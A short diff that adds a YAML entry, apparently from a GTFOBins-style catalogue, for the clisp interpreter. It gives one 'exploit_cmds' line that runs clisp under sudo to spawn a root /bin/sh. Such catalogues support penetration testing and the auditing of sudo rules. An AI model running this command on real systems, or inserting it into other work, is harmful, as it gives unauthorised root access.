@@ -1,0 +1,4 @@
+name: clisp
+binary_path: /usr/bin/clisp
+exploit_cmds:
+- sudo /usr/bin/clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
